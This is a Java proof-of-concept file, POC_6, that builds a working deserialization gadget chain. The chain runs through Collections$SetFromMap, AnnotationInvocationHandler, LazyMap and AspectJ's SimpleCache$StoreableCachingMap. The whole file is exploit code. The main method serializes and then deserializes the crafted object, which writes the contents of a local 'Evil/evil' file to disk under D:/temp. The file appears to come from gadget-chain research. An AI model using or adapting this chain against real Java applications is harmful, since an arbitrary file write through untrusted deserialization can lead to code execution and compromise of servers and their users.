package com.example.AspectJWeaver;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Retention;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Map;
import java.util.Set;

public class POC_6 {

    /***
     * <java.util.Collections$SetFromMap: void readObject(java.io.ObjectInputStream)>
     * <sun.reflect.annotation.AnnotationInvocationHandler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
     * <org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
     * <org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap: java.lang.String writeToPath(java.lang.String,byte[])>
     * <java.io.FileOutputStream: void write(byte[])>
     */

    public static void main(String[] args) throws Exception {
        Map scm = (Map) ReflectionUtil.createObject("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap",
                new Class[]{String.class, int.class},
                new Object[]{"D:/temp", 12});
        byte[] content = Files.readAllBytes(Paths.get("./src/main/java/com/example/Evil/evil"));
        Transformer ct = new ConstantTransformer(content);
        Map lazyMap = LazyMap.decorate(scm, ct);

        Class mapClz = Class.forName("java.util.Collections$SetFromMap");
        Set sfm = (Set) ReflectionUtil.createWithoutConstructor(mapClz);
        InvocationHandler handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, lazyMap});

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class}, handler);
        ReflectionUtil.setField(sfm, "m", proxyMap);
        SerializeUtil.deserialize(SerializeUtil.serialize(sfm));
    }

}
